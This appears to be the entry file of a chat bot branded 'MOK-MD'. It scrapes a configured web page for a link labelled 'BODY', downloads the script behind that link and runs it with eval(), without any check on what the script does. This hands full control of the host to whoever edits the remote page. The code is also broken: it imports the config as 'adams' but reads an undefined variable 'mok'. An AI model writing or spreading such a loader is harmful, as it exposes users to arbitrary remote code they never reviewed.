//  [⬛━━━━━━⬛  𖤐 𝙈𝙊𝙆-𝙈𝘿   ⬛━━━━━━⬛ EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Mok Psuxin                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(mok.MOK_MD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The ⬛━━━━━━⬛  𖤐 𝙈𝙊𝙆-𝙈𝘿   ⬛━━━━━━⬛ is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();
